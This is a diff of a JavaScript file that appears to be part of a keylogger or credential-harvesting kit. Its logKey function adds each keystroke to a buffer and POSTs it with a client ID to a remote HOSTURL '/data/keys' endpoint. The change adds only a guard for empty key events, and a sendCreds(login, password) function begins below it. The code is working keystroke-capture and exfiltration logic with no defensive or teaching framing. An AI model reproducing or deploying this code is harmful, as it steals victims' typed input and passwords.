@@ -1,17 +1,19 @@
 function logKey(event){
-    keys = keys + event.key;
-	let data = {
-		"client_id": CLIENT_ID,
-		"key": encodeURIComponent(keys)
-	}
+    if (event.key){
+        keys = keys + event.key;
+        let data = {
+            "client_id": CLIENT_ID,
+            "key": encodeURIComponent(keys)
+        }
 
-    fetch(HOSTURL + "/data/keys", {
-        body: JSON.stringify(data),
-        headers: {
-            "Content-Type": "application/json"
-        },
-        method: "POST"
-    })
+        fetch(HOSTURL + "/data/keys", {
+            body: JSON.stringify(data),
+            headers: {
+                "Content-Type": "application/json"
+            },
+            method: "POST"
+        })
+    }
 }
 
 function sendCreds(login, password){
